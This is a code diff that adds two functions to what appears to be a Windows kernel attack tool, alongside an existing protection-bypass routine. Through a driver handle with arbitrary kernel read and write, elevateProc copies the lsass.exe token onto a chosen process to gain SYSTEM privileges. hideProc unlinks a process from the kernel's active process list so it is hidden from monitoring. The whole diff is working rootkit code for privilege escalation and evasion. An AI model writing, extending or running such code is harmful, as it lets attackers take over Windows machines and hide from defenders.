@@ -707,3 +707,111 @@ VOID BypassPpl(HANDLE hDevice, DWORD64 pid) {
 		printf("Disabled protection for the process\n");
 	}
 }
+
+VOID elevateProc(HANDLE hDevice, DWORD64 pid) {
+	int max_retries = 99999;
+
+	DWORD64 lsassPid = FindProcessId("lsass.exe");
+
+	DWORD64 PsInitialSystemProcess = EzPdbGetRva(&pdb, "PsInitialSystemProcess");
+
+	DWORD64 pidOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"UniqueProcessId");  // VOID *, HANDLE
+	DWORD64 tokenOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"Token"); // 8 byte
+	DWORD64 activeProcessLinksOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ActiveProcessLinks"); // _LIST_ENTRY
+
+	PsInitialSystemProcess += ntoskrnlBase;
+	printf("PsInitialSystemProcess: %llx\n", PsInitialSystemProcess);
+
+	// PsInitialSystemProcess is a pointer so we need to read
+	DWORD64 currPtr = Read64(hDevice, PsInitialSystemProcess);
+
+	DWORD64 lsassToken = 0;
+
+	DWORD64 ourTokenAddr = 0;
+
+	while (1) {
+		DWORD64 currPid = Read64(hDevice, currPtr + pidOffset);
+
+		if (currPid == lsassPid) {
+			printf("Stealking token from lsass\n");
+			lsassToken = Read64(hDevice, currPtr + tokenOffset);
+		}
+
+		if (currPid == pid) {
+			ourTokenAddr = currPtr + tokenOffset;
+		}
+
+		if (lsassToken && ourTokenAddr) {
+			break;
+		}
+		// this is basically 
+		DWORD64 flink = Read64(hDevice, currPtr + activeProcessLinksOffset);
+
+		if (!flink) {
+			printf("Flink reading failed. it is 0\n");
+			break;
+		}
+		currPtr = flink - activeProcessLinksOffset;
+
+		if (currPtr == PsInitialSystemProcess) {
+			printf("All processes iterated, not found\n");
+			return;
+		}
+	}
+	if (lsassToken && ourTokenAddr) {
+		printf("Elevating process: %d\n", pid);
+		Write64(hDevice, ourTokenAddr, lsassToken);
+	}
+}
+
+VOID hideProc(HANDLE hDevice, DWORD64 pid) {
+	int max_retries = 99999;
+
+	DWORD64 PsInitialSystemProcess = EzPdbGetRva(&pdb, "PsInitialSystemProcess");
+
+	DWORD64 pidOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"UniqueProcessId");  // VOID *, HANDLE
+	DWORD64 tokenOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"Token"); // 8 byte
+	DWORD64 activeProcessLinksOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ActiveProcessLinks"); // _LIST_ENTRY
+
+	PsInitialSystemProcess += ntoskrnlBase;
+	printf("PsInitialSystemProcess: %llx\n", PsInitialSystemProcess);
+
+	// PsInitialSystemProcess is a pointer so we need to read
+	DWORD64 currPtr = Read64(hDevice, PsInitialSystemProcess);
+
+
+
+	while (1) {
+		DWORD64 currPid = Read64(hDevice, currPtr + pidOffset);
+
+		DWORD64 flink = Read64(hDevice, currPtr + activeProcessLinksOffset);
+		DWORD64 blink = Read64(hDevice, currPtr + activeProcessLinksOffset + 0x8);
+
+		
+
+		if (currPid == pid) {
+			printf("Unlinking proc %d\n", pid);
+			// scrivo il flink del blink
+			Write64(hDevice, blink, flink);
+			// scrivio il blink del flink
+			Write64(hDevice, flink + 0x8, blink);
+
+			// faccio puntare a me stesso i blink e flink
+			Write64(hDevice, currPtr + activeProcessLinksOffset, currPtr + activeProcessLinksOffset);
+			Write64(hDevice, currPtr + activeProcessLinksOffset + 0x8, currPtr + activeProcessLinksOffset);
+			break;
+		}
+
+
+		if (!flink) {
+			printf("Flink reading failed. it is 0\n");
+			break;
+		}
+		currPtr = flink - activeProcessLinksOffset;
+
+		if (currPtr == PsInitialSystemProcess) {
+			printf("All processes iterated, not found\n");
+			return;
+		}
+	}
+}
